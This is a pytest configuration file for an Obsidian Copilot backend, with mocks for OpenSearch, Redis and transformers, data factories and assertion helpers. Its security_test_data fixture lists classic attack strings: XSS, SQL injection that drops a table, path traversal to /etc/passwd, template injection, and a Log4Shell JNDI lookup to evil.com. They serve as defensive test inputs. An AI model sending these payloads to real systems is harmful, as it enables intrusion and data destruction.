"""
Enhanced pytest configuration and shared fixtures for Obsidian Copilot testing.
Provides comprehensive mocking, parallel execution support, and advanced test utilities.
"""

import asyncio
import os
import pickle
import tempfile
import threading
import time
from contextlib import asynccontextmanager
from typing import Dict, List, Any, AsyncGenerator, Generator
from unittest.mock import AsyncMock, MagicMock, patch
from concurrent.futures import ThreadPoolExecutor

import pytest
import numpy as np
from fastapi.testclient import TestClient
from httpx import AsyncClient
import fakeredis.aioredis
from testcontainers.elasticsearch import ElasticSearchContainer
from testcontainers.redis import RedisContainer
import factory
from factory import Faker, SubFactory, LazyAttribute
from freezegun import freeze_time

from src.app import app
from src.prep.build_opensearch_index import get_opensearch


# ===== SESSION-SCOPED FIXTURES =====

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    yield loop
    loop.close()


@pytest.fixture(scope="session")
def parallel_executor():
    """Thread pool executor for parallel test operations."""
    with ThreadPoolExecutor(max_workers=4) as executor:
        yield executor


@pytest.fixture(scope="session")
def test_containers():
    """Test containers for integration testing."""
    containers = {}
    
    # Only start containers if integration tests are being run
    if "integration" in " ".join(os.sys.argv):
        # OpenSearch container
        containers["opensearch"] = ElasticSearchContainer("opensearchproject/opensearch:2.7.0")
        containers["opensearch"].start()
        
        # Redis container
        containers["redis"] = RedisContainer("redis:7-alpine")
        containers["redis"].start()
    
    yield containers
    
    # Cleanup containers
    for container in containers.values():
        if hasattr(container, 'stop'):
            container.stop()


# ===== FUNCTION-SCOPED FIXTURES =====

@pytest.fixture
def test_client():
    """FastAPI test client for API testing."""
    return TestClient(app)


@pytest.fixture
async def async_client():
    """Async HTTP client for testing async endpoints."""
    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client


@pytest.fixture
def performance_monitor():
    """Performance monitoring fixture for benchmarking tests."""
    class PerformanceMonitor:
        def __init__(self):
            self.measurements = {}
            self.start_times = {}
        
        def start(self, operation: str):
            self.start_times[operation] = time.time()
        
        def end(self, operation: str):
            if operation in self.start_times:
                duration = time.time() - self.start_times[operation]
                self.measurements[operation] = duration
                return duration
            return None
        
        def get_measurement(self, operation: str) -> float:
            return self.measurements.get(operation, 0.0)
        
        def assert_under_threshold(self, operation: str, max_seconds: float):
            duration = self.get_measurement(operation)
            assert duration <= max_seconds, f"{operation} took {duration:.3f}s, expected <= {max_seconds}s"
    
    return PerformanceMonitor()


# ===== MOCK DATA FIXTURES =====

@pytest.fixture
def comprehensive_vault_dict():
    """Comprehensive mock vault dictionary with diverse test documents."""
    return {
        "ml_basics": {
            "content": "# Machine Learning Basics\n\nMachine learning is a subset of artificial intelligence.",
            "title": "ML Basics",
            "path": "ml/basics.md",
            "tags": ["ml", "basics", "ai"],
            "created": "2024-01-01T00:00:00Z",
            "modified": "2024-01-02T00:00:00Z",
            "chunks": [
                "Machine learning is a subset of artificial intelligence.",
                "It enables computers to learn without explicit programming.",
                "Common algorithms include supervised and unsupervised learning."
            ]
        },
        "neural_networks": {
            "content": "# Neural Networks\n\nNeural networks are computing systems inspired by biological neural networks.",
            "title": "Neural Networks",
            "path": "ml/neural-networks.md",
            "tags": ["neural-networks", "deep-learning", "ai"],
            "created": "2024-01-03T00:00:00Z",
            "modified": "2024-01-04T00:00:00Z",
            "chunks": [
                "Neural networks are computing systems inspired by biological neural networks.",
                "They consist of interconnected nodes called neurons.",
                "Deep learning uses neural networks with multiple hidden layers."
            ]
        },
        "programming_best_practices": {
            "content": "# Programming Best Practices\n\nClean code is essential for maintainable software.",
            "title": "Programming Best Practices",
            "path": "programming/best-practices.md",
            "tags": ["programming", "clean-code", "software-engineering"],
            "created": "2024-01-05T00:00:00Z",
            "modified": "2024-01-06T00:00:00Z",
            "chunks": [
                "Clean code is essential for maintainable software.",
                "Functions should be small and do one thing well.",
                "Meaningful names improve code readability."
            ]
        },
        "project_notes": {
            "content": "# Project Notes\n\nObsidian Copilot project development progress.",
            "title": "Project Notes",
            "path": "projects/obsidian-copilot.md",
            "tags": ["project", "obsidian", "copilot"],
            "created": "2024-01-07T00:00:00Z",
            "modified": "2024-01-08T00:00:00Z",
            "chunks": [
                "Obsidian Copilot project development progress.",
                "Integration with Claude API successful.",
                "Backend service architecture complete."
            ]
        }
    }


@pytest.fixture
def mock_embeddings():
    """High-quality mock embeddings for semantic search testing."""
    # Create embeddings that have some semantic similarity patterns
    np.random.seed(42)  # For reproducible tests
    
    # 4 documents, 384-dimensional embeddings (E5-small-v2 size)
    embeddings = np.random.rand(4, 384).astype(np.float32)
    
    # Make ML-related documents more similar
    embeddings[0] = embeddings[0] * 0.7 + embeddings[1] * 0.3  # ml_basics similar to neural_networks
    
    return embeddings


@pytest.fixture
def mock_embedding_index():
    """Mock embedding index mapping with comprehensive coverage."""
    return {
        0: "ml_basics",
        1: "neural_networks", 
        2: "programming_best_practices",
        3: "project_notes"
    }


# ===== ADVANCED MOCKING FIXTURES =====

@pytest.fixture
def mock_opensearch_client():
    """Advanced mock OpenSearch client with realistic responses."""
    mock_client = MagicMock()
    
    # Mock connection and info
    mock_client.info.return_value = {
        "version": {"number": "2.7.0"},
        "cluster_name": "test_cluster"
    }
    
    # Mock search with dynamic responses based on query
    def mock_search(*args, **kwargs):
        query = kwargs.get("body", {}).get("query", {})
        query_text = str(query).lower()
        
        # Return relevant results based on query content
        if "machine learning" in query_text or "ml" in query_text:
            hits = [
                {
                    "_source": {
                        "content": "Machine learning is a subset of artificial intelligence.",
                        "title": "ML Basics",
                        "path": "ml/basics.md"
                    },
                    "_score": 0.95
                },
                {
                    "_source": {
                        "content": "Neural networks are computing systems inspired by biology.",
                        "title": "Neural Networks", 
                        "path": "ml/neural-networks.md"
                    },
                    "_score": 0.87
                }
            ]
        elif "programming" in query_text or "code" in query_text:
            hits = [
                {
                    "_source": {
                        "content": "Clean code is essential for maintainable software.",
                        "title": "Programming Best Practices",
                        "path": "programming/best-practices.md"
                    },
                    "_score": 0.92
                }
            ]
        else:
            hits = [
                {
                    "_source": {
                        "content": "Generic search result for testing.",
                        "title": "Test Document",
                        "path": "test/document.md"
                    },
                    "_score": 0.75
                }
            ]
        
        return {
            "hits": {
                "total": {"value": len(hits)},
                "hits": hits
            },
            "took": 5,
            "timed_out": False
        }
    
    mock_client.search.side_effect = mock_search
    
    # Mock index operations
    mock_client.indices.exists.return_value = True
    mock_client.indices.create.return_value = {"acknowledged": True}
    mock_client.indices.delete.return_value = {"acknowledged": True}
    mock_client.indices.refresh.return_value = {"_shards": {"successful": 1}}
    
    return mock_client


@pytest.fixture
def mock_redis_client():
    """Advanced Redis mock with persistent state across operations."""
    redis_mock = fakeredis.aioredis.FakeRedis(decode_responses=True)
    
    # Pre-populate with some test data
    async def setup_test_data():
        await redis_mock.set("test:key", "test_value")
        await redis_mock.hset("test:hash", "field1", "value1")
        await redis_mock.lpush("test:list", "item1", "item2")
    
    # Run setup in event loop
    asyncio.create_task(setup_test_data())
    
    return redis_mock


@pytest.fixture
def mock_transformers():
    """Advanced transformers mock with realistic embeddings."""
    mock_tokenizer = MagicMock()
    mock_model = MagicMock()
    
    # Mock tokenizer with realistic token counts
    def mock_tokenize(text, **kwargs):
        # Approximate token count (4 chars per token)
        token_count = max(1, len(text) // 4)
        return {
            "input_ids": [list(range(1, token_count + 1))],
            "attention_mask": [[1] * token_count]
        }
    
    mock_tokenizer.side_effect = mock_tokenize
    mock_tokenizer.encode.side_effect = lambda text: list(range(1, len(text) // 4 + 1))
    
    # Mock model with realistic embeddings
    def mock_forward(*args, **kwargs):
        batch_size = 1
        seq_length = len(args[0]["input_ids"][0]) if args else 10
        hidden_size = 384
        
        # Create embeddings with some structure
        embeddings = np.random.randn(batch_size, seq_length, hidden_size).astype(np.float32)
        
        class MockOutput:
            def __init__(self, embeddings):
                self.last_hidden_state = embeddings
        
        return MockOutput(embeddings)
    
    mock_model.side_effect = mock_forward
    
    return {
        "tokenizer": mock_tokenizer,
        "model": mock_model
    }


# ===== TEST DATA FACTORIES =====

class VaultDocumentFactory(factory.Factory):
    """Factory for creating vault documents."""
    
    class Meta:
        model = dict
    
    title = Faker("sentence", nb_words=3)
    path = LazyAttribute(lambda obj: f"{obj.title.lower().replace(' ', '-')}.md")
    content = Faker("text", max_nb_chars=500)
    tags = factory.List([Faker("word") for _ in range(3)])
    created = Faker("date_time_this_year")
    modified = Faker("date_time_this_year")


class ApiRequestFactory(factory.Factory):
    """Factory for creating API requests."""
    
    class Meta:
        model = dict
    
    query = Faker("sentence", nb_words=5)
    context_strategy = Faker("random_element", elements=["full_docs", "smart_chunks", "hierarchical"])
    system_prompt = "You are a helpful assistant."
    temperature = Faker("pyfloat", min_value=0.0, max_value=1.0)
    max_tokens = Faker("pyint", min_value=100, max_value=4000)
    model = "claude-3-5-sonnet-20241022"


@pytest.fixture
def document_factory():
    """Vault document factory for creating test documents."""
    return VaultDocumentFactory


@pytest.fixture
def api_request_factory():
    """API request factory for creating test requests."""
    return ApiRequestFactory


# ===== ENVIRONMENT SETUP FIXTURES =====

@pytest.fixture
def temp_data_dir(comprehensive_vault_dict, mock_embeddings, mock_embedding_index):
    """Create comprehensive temporary data directory with mock files."""
    with tempfile.TemporaryDirectory() as temp_dir:
        # Create mock pickle files
        vault_path = os.path.join(temp_dir, "vault_dict.pickle")
        with open(vault_path, "wb") as f:
            pickle.dump(comprehensive_vault_dict, f)
        
        embeddings_path = os.path.join(temp_dir, "doc_embeddings_array.npy")
        np.save(embeddings_path, mock_embeddings)
        
        index_path = os.path.join(temp_dir, "embedding_index.pickle")
        with open(index_path, "wb") as f:
            pickle.dump(mock_embedding_index, f)
        
        # Create agent configuration
        agent_config = {
            "agents": {
                "vault-analyzer": {
                    "role": "Document Analysis Specialist",
                    "capabilities": ["vault_analysis", "document_categorization"],
                    "max_parallel_tasks": 5
                },
                "synthesis-assistant": {
                    "role": "Content Synthesis Expert",
                    "capabilities": ["content_synthesis", "cross_reference"],
                    "max_parallel_tasks": 3
                }
            }
        }
        
        config_path = os.path.join(temp_dir, "agent_config.json")
        import json
        with open(config_path, "w") as f:
            json.dump(agent_config, f)
        
        # Patch environment variables
        with patch.dict(os.environ, {
            "DATA_DIR": temp_dir,
            "AGENT_CONFIG_PATH": config_path
        }):
            yield temp_dir


@pytest.fixture(autouse=True)
def setup_test_environment(
    mock_opensearch_client,
    mock_redis_client,
    mock_transformers,
    temp_data_dir,
    comprehensive_vault_dict,
    mock_embeddings,
    mock_embedding_index
):
    """Enhanced automatic test environment setup with comprehensive mocking."""
    with patch("src.app.get_opensearch", return_value=mock_opensearch_client), \
         patch("src.app.vault", comprehensive_vault_dict), \
         patch("src.app.doc_embeddings_array", mock_embeddings), \
         patch("src.app.embedding_index", mock_embedding_index), \
         patch("transformers.AutoTokenizer.from_pretrained", return_value=mock_transformers["tokenizer"]), \
         patch("transformers.AutoModel.from_pretrained", return_value=mock_transformers["model"]), \
         patch("redis.asyncio.from_url", return_value=mock_redis_client):
        yield


# ===== HELPER CLASSES AND UTILITIES =====

class MockAsyncContext:
    """Enhanced helper for mocking async context managers."""
    
    def __init__(self, return_value, side_effect=None):
        self.return_value = return_value
        self.side_effect = side_effect
        self.enter_count = 0
        self.exit_count = 0
    
    async def __aenter__(self):
        self.enter_count += 1
        if self.side_effect:
            await self.side_effect()
        return self.return_value
    
    async def __aexit__(self, *args):
        self.exit_count += 1


class TestTimer:
    """Utility for timing test operations."""
    
    def __init__(self):
        self.start_time = None
        self.end_time = None
    
    def start(self):
        self.start_time = time.time()
    
    def stop(self):
        self.end_time = time.time()
        return self.duration
    
    @property
    def duration(self):
        if self.start_time and self.end_time:
            return self.end_time - self.start_time
        return None


@pytest.fixture
def test_timer():
    """Timer utility for performance testing."""
    return TestTimer()


# ===== SPECIALIZED TESTING FIXTURES =====

@pytest.fixture
async def streaming_response_mock():
    """Mock for testing streaming responses."""
    async def mock_stream():
        chunks = [
            "This is a ",
            "streaming response ",
            "for testing ",
            "purposes."
        ]
        for chunk in chunks:
            await asyncio.sleep(0.01)  # Simulate network delay
            yield chunk
    
    return mock_stream()


@pytest.fixture
def security_test_data():
    """Test data for security testing scenarios."""
    return {
        "malicious_inputs": [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ],
        "valid_api_keys": [
            "sk-ant-api03-test-key-1234567890abcdef",
            "sk-proj-test-openai-key-1234567890abcdef"
        ],
        "invalid_api_keys": [
            "invalid-key",
            "",
            "sk-ant-", 
            "too-short"
        ]
    }


# ===== UTILITY FUNCTIONS =====

def assert_response_structure(response: Dict[str, Any], required_fields: List[str]):
    """Enhanced assertion for response structure validation."""
    missing_fields = [field for field in required_fields if field not in response]
    assert not missing_fields, f"Missing required fields: {missing_fields}"
    
    # Additional structure validation
    if "status" in response:
        assert isinstance(response["status"], (int, str))
    if "data" in response:
        assert response["data"] is not None
    if "error" in response:
        assert isinstance(response["error"], str)


def assert_error_response(response: Dict[str, Any], expected_status: int):
    """Enhanced assertion for error response validation."""
    assert "detail" in response or "error" in response
    if "status_code" in response:
        assert response["status_code"] == expected_status


def assert_performance_threshold(duration: float, max_seconds: float, operation: str = "operation"):
    """Assert that operation completed within performance threshold."""
    assert duration <= max_seconds, f"{operation} took {duration:.3f}s, expected <= {max_seconds}s"


@pytest.fixture
def assert_helpers():
    """Collection of assertion helper functions."""
    return {
        "response_structure": assert_response_structure,
        "error_response": assert_error_response,
        "performance": assert_performance_threshold
    }


# ===== PARAMETRIZED TEST DATA =====

@pytest.fixture(params=[
    {"context_strategy": "full_docs", "expected_chunks": 4},
    {"context_strategy": "smart_chunks", "expected_chunks": 2},
    {"context_strategy": "hierarchical", "expected_chunks": 3}
])
def context_strategy_params(request):
    """Parametrized fixture for testing different context strategies."""
    return request.param


@pytest.fixture(params=[
    {"temperature": 0.0, "expected_variation": "low"},
    {"temperature": 0.7, "expected_variation": "medium"},
    {"temperature": 1.0, "expected_variation": "high"}
])
def temperature_params(request):
    """Parametrized fixture for testing different temperature settings."""
    return request.param


# ===== CLEANUP AND RESOURCE MANAGEMENT =====

@pytest.fixture(autouse=True)
def cleanup_resources():
    """Automatic cleanup of resources after each test."""
    yield
    
    # Clean up any remaining async tasks
    try:
        tasks = [task for task in asyncio.all_tasks() if not task.done()]
        if tasks:
            asyncio.get_event_loop().run_until_complete(
                asyncio.gather(*tasks, return_exceptions=True)
            )
    except Exception:
        pass  # Ignore cleanup errors


# Export commonly used fixtures and utilities
__all__ = [
    "test_client",
    "async_client", 
    "comprehensive_vault_dict",
    "mock_embeddings",
    "mock_opensearch_client",
    "mock_redis_client",
    "performance_monitor",
    "document_factory",
    "api_request_factory",
    "assert_helpers",
    "TestTimer",
    "MockAsyncContext"
]